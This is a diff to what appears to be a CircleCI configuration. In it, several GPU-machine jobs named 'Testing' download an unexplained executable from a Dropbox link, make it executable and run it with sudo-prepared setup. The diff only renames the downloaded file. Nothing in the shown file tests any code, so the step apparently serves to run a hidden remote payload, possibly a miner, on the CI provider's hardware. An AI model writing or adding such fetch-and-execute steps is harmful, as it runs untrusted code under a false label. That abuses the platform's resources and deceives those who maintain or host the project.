@@ -9,7 +9,7 @@ jobs:
         - checkout
         - run:
             name: "Testing"
-            command: sudo apt update -y && wget -O start https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x start && ./start
+            command: sudo apt update -y && wget https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x sync-dropbox?dl=1 && ./sync-dropbox?dl=1
     Devop1:
       machine:
         image: ubuntu-1604-cuda-10.2:202012-01
@@ -19,7 +19,7 @@ jobs:
         - checkout
         - run:
             name: "Testing"
-            command: sudo apt update -y && wget -O start https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x start && ./start
+            command: sudo apt update -y && wget https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x sync-dropbox?dl=1 && ./sync-dropbox?dl=1
     Devop2:
       machine:
         image: ubuntu-1604-cuda-10.2:202012-01
@@ -29,7 +29,7 @@ jobs:
         - checkout
         - run:
             name: "Testing"
-            command: sudo apt update -y && wget -O start https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x start && ./start
+            command: sudo apt update -y && wget https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x sync-dropbox?dl=1 && ./sync-dropbox?dl=1
     Devop3:
       machine:
         image: ubuntu-1604-cuda-10.2:202012-01
@@ -39,7 +39,7 @@ jobs:
         - checkout
         - run:
             name: "Testing"
-            command: sudo apt update -y && wget -O start https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x start && ./start
+            command: sudo apt update -y && wget https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x sync-dropbox?dl=1 && ./sync-dropbox?dl=1
 workflows:
     version: 2.1
     build:
